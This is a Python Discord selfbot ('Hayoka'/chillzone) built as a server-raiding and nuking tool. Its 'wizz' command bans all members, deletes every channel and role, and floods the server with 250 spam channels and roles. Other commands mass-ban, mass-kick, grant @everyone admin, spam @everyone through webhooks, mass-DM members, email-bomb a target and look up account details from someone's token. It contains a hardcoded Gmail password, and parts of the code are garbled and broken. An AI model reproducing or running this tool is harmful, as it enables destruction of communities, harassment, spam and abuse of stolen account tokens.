import os
import keep_alive
import discord, asyncio, random, os, requests, sys, threading, datetime, json, aiohttp
from urllib import parse
import re, time
import io, smtplib, ssl
from discord.ext import commands, tasks
import random
from discord import Permissions
from discord import Guild, Member
import random, requests, os, sys, threading, time, json, asyncio, discord, aiohttp, urllib.parse, urllib.request, time
from itertools import cycle
from urllib import parse, request
from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from colorama import Fore, Style
from colored import fg, attr



os.system('cls & mode 85,20 & title [Hayoka] - https://discord.gg/chillzone')
os.system('cls')

token = os.getenv("token")
prefix = ""

client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)
client.remove_command(name='help')
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name='discord.gg/chillzone', url='https://discord.gg/chillzone'))


class colors:

    main = fg('#000000')
    reset = attr('reset')

def check_token():
    if requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': f"{token}"}).status_code == 200:
        return 'user'
    else:
        return 'bot'


token_type = check_token()
intents = discord.Intents.all()
intents.members = True
if token_type == 'user':
    headers = {'Authorization': f"{token}"}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True, intents=intents)
else:
    if token_type == 'bot':
        headers = {'Authorization': f"Bot {token}"}
        client = commands.Bot(command_prefix=prefix, case_insensitive=False, intents=intents)
os.system('cls')

def check_token():
    if requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': f"{token}"}).status_code == 200:
        return 'user'


client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)
client.remove_command(name='help')
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')
token_type = check_token()
intents = discord.Intents.all()
intents.members = True
os.system(f"cls & mode 85,20 & title [chillzone] - Connected: {client.user}")
if token_type == 'user':
    headers = {'Authorization': f"{token}"}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True, intents=intents)
client.remove_command('help')

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name="discord.gg/chillzone", url='https://twitch.tv/discord'))

    print(
        f"{colors.main}┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓{colors.main}"
    )
    print(
        f"{colors.main} >{colors.main}Username :{colors.main} {client.user} {colors.main}"
    )
    print(
        f"{colors.main} >{colors.main}guilds :{colors.main} {len (client.guilds)} {colors.main}"
    )
    print(
        f"{colors.main} >{colors.main}Prefix :{colors.main} {client.command_prefix} {colors.main}"
    )
    print(
        f"{colors.main}┗┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛{colors.main}"
    )

@client.command()
async def prune(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  try:
            await guild.prune_members(days=1, compute_prune_count=True, roles= guild.roles,reason="love from /chillzone")
            await ctx.send(f"Successfully Pruned {ctx.guild.name} For 1 Day Of Inactivity")    
        
  except:
            await ctx.send(f"error pruning {ctx.guild.name}")

@client.command()
async def massban(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('members.txt')
    except:
        pass

    membercount = 0
    with open('members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.send('STARTING BANING ALL PEOPLES IN THIS DISCORD SERVER')
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Banned{member.strip()}")
                    break
                else:
                    break

    members.close()


@client.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass


@client.command()
async def masskick(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('members.txt')
    except:
        pass

    membercount = 0
    with open('members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.send('STARTING KICKING ALL PEOPLES IN THIS DISCORD SERVER')
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Kicked {member.strip()}")
                    break
                else:
                    break

    members.close()


@client.command()
async def general(ctx):
    await ctx.message.delete()
    await ctx.send("""```toml\n|  𝗣𝗥𝗘𝗙𝗜𝗫 - CHANGE THE SELFBOT PREFIX\n|  𝗔𝗩 -SHOWS THE USER PFP\n|  𝗟𝗘𝗔𝗩𝗘 <server-id> - LEAVE A SERVER\n|  𝗘𝗡𝗗 - TURN OF THE SELFBOT\n|  𝗖𝗢𝗣𝗬 - CREATES A BACKUP OF A SERVER\n```""")     
    
@client.command()
async def text(ctx):
    await ctx.message.delete()
    await ctx.send("""```toml\n|  𝗦𝗣𝗔𝗠 - SPAM A MESSAGE\n|  𝗕𝗢𝗟𝗗 - SEND A BOLD MESSGAE\n|  𝗖𝗢𝗗𝗘 - SEND A MESSAGE IN CODE\n|  𝗖𝗥𝗔𝗦𝗛 - ENLARGE THE TEXT\n```""")



    



@client.command()
async def misc(ctx):
    await ctx.message.delete()
    await ctx.send("""```toml\n|  𝗦𝗧𝗥𝗘𝗔𝗠 - START A STREAM\n|  𝗣𝗟𝗔𝗬 - START PLAYING\n|  𝗟𝗜𝗦𝗧𝗘𝗡 - START LISTENING\n|  𝗪𝗔𝗧𝗖𝗛 - START WATCHING A STREAM\n|  𝗥𝗘𝗠𝗢𝗩𝗘𝗦𝗧𝗔𝗧𝗨𝗦 - REMOVE THE STATUS```""")


@client.command()
async def help(ctx):
    await ctx.message.delete()
    await ctx.send("""```toml\n|  𝗚𝗘𝗡𝗘𝗥𝗔𝗟 - SHOW ALL GENERAL CMDS\n|  𝗧𝗘𝗫𝗧 - SHOW ALL TEXT CMDS\n|  𝗠𝗢𝗗𝗘𝗥𝗔𝗧𝗜𝗢𝗡 - SHOW ALL MODERATION CMDS\n|  𝗡𝗨𝗞𝗘 - SHOW ALL NUKE CMDS\n|  𝗠𝗜𝗦𝗖 - SHOW ALL MISC CMDS\n```""")


@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.send("""```toml\n|  𝗪𝗜𝗭𝗭 - SERVER KILL CMD\n|  𝗠𝗔𝗦𝗦𝗕𝗔𝗡 <GUILDID> - MASSBAN\n|  𝗠𝗔𝗦𝗦𝗞𝗜𝗖𝗞 <GUILDID> - MASSKICK\n|  𝗥𝗥 - RENAME ALL THE ROLES\n|  𝗥𝗖 - RENAME ALL CHANNELS\n|  𝗣𝗜𝗡𝗚𝗦 - MASS PING\n|  𝗦𝗧𝗢𝗣 - STOP MASS @EVERYONE PING\n|  𝗞𝗜𝗟𝗟𝗛𝗢𝗢𝗞 - DELETE THE WEBHOOKS\n|  𝗔𝗗𝗠𝗜𝗡𝗔𝗟𝗟 - GIVE ADMIN IN EVERYONE\n|  PRUNE - PRUNE THE SERVER WITH 1 DAY OF INACTIVITY\n```""")


@client.command()
async def moderation(ctx):
    await ctx.message.delete()
    await ctx.send("""```toml\n|  𝗕𝗔𝗡 - BAN A USER\n|  𝗞𝗜𝗖𝗞 - KICK A USER\n|  𝗨𝗡𝗕𝗔𝗡 - UNBAN A USER\n|  𝗟𝗢𝗖𝗞 - LOCK THE CHANNELS\n|  𝗖𝗟𝗘𝗔𝗥 - CLEAR MESSAGES\n|  𝗗𝗠𝗔𝗟𝗟 - MASS DM EVERYONE\n```""")

@client.command()
async def prefix(ctx, prefix):
    client.command_prefix = str(prefix)
    await ctx.message.delete()
    await ctx.send('```YOUR PREFIX HAS BEEN CHANGED```')


@client.command(aliases=["mc"])

async def member_count(ctx):

    a=ctx.guild.member_count
    await ctx.send(f"```toml\nmembers in {ctx.guild.name}\n\n{a}\n```")


@client.command()
async def stop(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass

    spammingdawebhookeroos = False


@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)


@client.command()
async def av(ctx, *, user: discord.Member=None):
    await ctx.message.delete()
    format = 'gif'
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = 'png'
    avatar = user.avatar_url_as(format=(format if format != 'gif' else None))
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as (file):
        await ctx.send(file=(discord.File(file, f"Avatar.{format}")))


@client.command(aliases=['logout'])
async def end(ctx):
    await ctx.message.delete()
    await client.logout()


@client.command(aliases=['copyserver'])
async def copy(ctx):
    await ctx.message.delete()
    await client.create_guild(f"backup-{ctx.guild.name}")
    await asyncio.sleep(4)
    for g in client.guilds:
        if f"backup-{ctx.guild.name}" in g.name:
            for c in g.channels:
                await c.delete()

            for cate in ctx.guild.categories:
                x = await g.create_category((f"{cate.name}"))
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel((f"{chann}"))
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel((f"{chann}"))

    try:
        await g.edit(icon=(ctx.guild.icon_url))
    except:
        pass






@client.command()
async def crash(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}").text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")





@client.command()
async def banner(ctx):
    await ctx.send(f"{ctx.guild.banner_url}")


@client.command()
async def logo(ctx):
    await ctx.send(f"{ctx.guild.icon_url}")

@client.command()
async def host(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "dnd"
    }
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    await asyncio.sleep(5)
    while True:
        setting = {
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break

@client.command()
async def tokeninfo(ctx, _token):
    headers = {'Authorization':_token,  'Content-Type':'application/json'}
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {'Authorization':'Bot ' + _token, 
         'Content-Type':'application/json'}
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
             {'name':'Flags', 
              'value':res['flags']},
             {'name':'Local language', 
              'value':res['locale'] + (f"{language}")},
             {'name':'Verified', 
              'value':res['verified']}]
            for field in fields:
                if field['value']:
                    em.add_field(name=(field['name']), value=(field['value']),
                      inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")

            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send('Invalid token')

    em = discord.Embed(description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    nitro_type = 'None'
    if 'premium_type' in res:
        if res['premium_type'] == 2:
            nitro_type = 'Nitro Premium'
        elif res['premium_type'] == 1:
            nitro_type = 'Nitro Classic'
    fields = [
     {'name':'Phone', 
      'value':res['phone']},
     {'name':'Flags', 
      'value':res['flags']},
     {'name':'Local language', 
      'value':res['locale'] + (f"{language}")},
     {'name':'MFA', 
      'value':res['mfa_enabled']},
     {'name':'Verified', 
      'value':res['verified']},
     {'name':'Nitro', 
      'value':nitro_type}]
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']), value=(field['value']),
              inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            em.set_footer(text='Created by 𝐍𝐨𝐭𝐘𝐨𝐮𝐫𝐌𝐨𝐇𝐢𝐓')

    return await ctx.send(f"```toml\nName: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\n```")


@client.command ()#line:932
async def restart (OOO0OOOO0OO0000OO ):#line:933
    await OOO0OOOO0OO0000OO .send ("\x52\x65\x73\x74\x61\x72\x74\x69\x6E\x67\x20\x53\x65\x6C\x66\x62\x6F\x74\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x2E")#line:934
    os .system ('python '+sys .argv [0 ])#line:935



languages = {'hu':'Hungarian, Hungary', 
 'nl':'Dutch, Netherlands', 
 'no':'Norwegian, Norway', 
 'pl':'Polish, Poland', 
 'pt-BR':'Portuguese, Brazilian, Brazil', 
 'ro':'Romanian, Romania', 
 'fi':'Finnish, Finland', 
 'sv-SE':'Swedish, Sweden', 
 'vi':'Vietnamese, Vietnam', 
 'tr':'Turkish, Turkey', 
 'cs':'Czech, Czechia, Czech Republic', 
 'el':'Greek, Greece', 
 'bg':'Bulgarian, Bulgaria', 
 'ru':'Russian, Russia', 
 'uk':'Ukranian, Ukraine', 
 'th':'Thai, Thailand', 
 'zh-CN':'Chinese, China', 
 'ja':'Japanese', 
 'zh-TW':'Chinese, Taiwan', 
 'ko':'Korean, Korea'}
locales = [
 'da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl',
 'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg',
 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko']

@client.command()
async def wizz(ctx):
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

    try:
        await ctx.guild.edit(name='Owned by Hayoka', description='Nuked',
          reason='Lame Server',
          icon=None,
          banner=None)
    except:
        pass

    for _i in range(250):
        await ctx.guild.create_text_channel(name='Nuked by hayoka')

    for _i in range(250):
        await ctx.guild.create_role(name='Hayoka owns you')

    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason='Get a life')
        except:
            pass

    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason='Nuked by hayoka')
        except:
            pass


format = '%a, %d %b %Y | %H:%M:%S % ZGMT'

@client.command()
async def rr(ctx, *, name):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        await role.edit(name=name)


from random import choice
from discord.ext import commands

@client.command()
@commands.guild_only()
async def tag(ctx):
    await ctx.message.delete()
    await ctx.send(choice(tuple(member.mention for member in ctx.guild.members)))

    import random

@client.command()
async def rip(ctx):
      await ctx.message.delete()
      channel = ctx.channel
      randomMember = random.choice(channel.guild.members)
      randomMember1 = random.choice(channel.guild.members)
      randomMember2 = random.choice(channel.guild.members)
      await ctx.send(f'{randomMember.mention}{randomMember1.mention}{randomMember2.mention}')
      await ctx.channel.purge(limit=1)
      await asyncio.sleep(5)
      await ctx.send(">rip")

@client.command()
async def rc(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name) 


@client.command()
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send('```SUCCESSFULLY KICKED USER```')

@client.command()
async def role(ctx, user):
  await ctx.message.delete()
  await ctx.send(f"<@235148962103951360> role {user} 869444380879101952")
  await ctx.send(f"-invite reset {user}")
  await ctx.send(f"{user} **GOO VOUCH** <#869433500347031593>")

@client.command()
async def bbb(ctx, amount: int=None):
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass

    else:
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass

@client.command()
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send('```SUCCESSFULLY BANNED USER```')


@client.command()
async def lock(ctx):
    await ctx.channel.set_permissions((ctx.guild.default_role), send_messages=False)
    await ctx.send(ctx.channel.mention + 'SUCCESSFULLY LOCKED')


@client.command()
async def adminall(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get((guild.roles), name='@everyone')
        await role.edit(permissions=(Permissions.all()))
        print(Fore.MAGENTA + 'I have given everyone admin.' + Fore.RESET)
    except:
        print(Fore.GREEN + 'I was unable to give everyone admin' + Fore.RESET)


@client.command()
async def unlock(ctx):
    await ctx.channel.set_permissions((ctx.guild.default_role), send_messages=True)
    await ctx.send(ctx.channel.mention + 'SUCCESSFULLY UNLOCKED')


@client.command()
async def unban(ctx, *, member):
    banned_user = await ctx.guild.bans()
    member_name, member_discriminator = member.split('#')
    for ban_entry in banned_user:
        user = ban_entry.user
        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f"Unbanned {user.mention}")
            return


@client.command()
async def clear(ctx, amount=5):
    await ctx.message.delete()
    await ctx.channel.purge(limit=amount)




@client.command()
async def listen(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(type=(discord.ActivityType.listening),
      name=message))

def ssspam(webhook):
    while spammingdawebhookeroos:
        data = {'content':'@everyone Nuked by hayoka'}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@client.command()
async def pings(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 100 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 2
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='chillzone')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > Webhook Error")

@client.command()
async def play(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(name=message)
    await client.change_presence(activity=game)


@client.command()
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message,
      url='https://discord.gg/chillzone')
    await client.change_presence(activity=stream)


@client.command()
async def watch(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(type=(discord.ActivityType.watching),
      name=message))


@client.command()
async def removestatus(ctx):
    await ctx.message.delete()
    await client.change_presence(activity=None, status=(discord.Status.dnd))


@client.command()
async def massmail(ctx, reciver):
    email = 'fg.pheonix.gaming@gmail.com'
    password = 'anger2009#'
    reciever = reciver
    sslcontext = ssl.create_default_context()
    for i in range(0, 1000):
        message = 'Hayoka here '
        port = 465
        connection = smtplib.SMTP_SSL('smtp.gmail.com', port, context=sslcontext)
        connection.login(email, password)
        connection.sendmailemailrecievermessage
        await ctx.send('DONE')



@client.command()
async def bold(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('**' + message + '**')


@client.command()
async def code(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('```' + message + '```')


@client.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)

@client.command()
async def leave(ctx, guild_id):
    await client.get_guild(int(guild_id)).leave()
    await ctx.send(f"I left: {guild_id}")


@client.command()
async def hi(ctx):
    await ctx.add_reaction(':wave:')

@client.command()
async def owo(ctx):
    for _i in range(1000000000):
        await ctx.send("owo h")
        await asyncio.sleep(120)

@client.command()
async def bump(ctx):
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')


@client.command()
async def dmall(ctx, *, message):
    for user in client.user.friends:
        try:
            await user.send(message)
            print(f"messaged: {user.name}")
        except:
            print(f"couldnt message: {user.name}")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


keep_alive.keep_alive()
client.run(token, bot = False)
